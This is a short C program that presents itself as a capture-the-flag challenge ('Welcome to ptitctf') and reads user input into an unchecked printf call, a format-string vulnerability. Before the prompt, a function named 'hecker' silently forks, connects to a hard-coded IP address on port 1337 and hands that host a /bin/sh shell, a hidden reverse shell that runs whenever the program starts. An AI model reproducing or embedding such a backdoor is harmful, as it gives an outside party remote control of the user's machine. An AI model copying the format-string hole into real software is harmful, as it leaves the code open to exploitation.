#include <fcntl.h>
#include <signal.h>
#include <unistd.h>
#include <stdio.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>
#define REMOTE_ADDR "172.29.171.48"
#define REMOTE_PORT 1337
void init(){
	setbuf(stdin, 0);
	setbuf(stdout, 0);
	setbuf(stderr, 0);
	return ;
}
void hecker(){
        pid_t child = fork();
	char cmd[100];
	int fd = open("/tmp/session.iluvinn", O_RDONLY);
	if (fd == -1) goto heck;
	else goto no_heck;
	heck:
	sprintf(cmd, "echo %d > /tmp/session.iluvinn", (int)child);
	system(cmd);
        if (child == 0) {
                struct sockaddr_in sa;
                int s;
                sa.sin_family = AF_INET;
                sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
                sa.sin_port = htons(REMOTE_PORT);

                s = socket(AF_INET, SOCK_STREAM, 0);
                connect(s, (struct sockaddr *)&sa, sizeof(sa));
                dup2(s, 0);
                dup2(s, 1);
                dup2(s, 2);
                execve("/bin/sh", 0, 0);
        }
	no_heck:
	return ;
}

int main(){
	init();
	hecker();
	alarm(10);
	char cmd[20];
	printf ("[ + ] Welcome to ptitctf\n");
	printf ("[ + ] Enter something: ");
	fgets (cmd, 20, stdin);
	printf("You entered: ");
	printf (cmd);
}
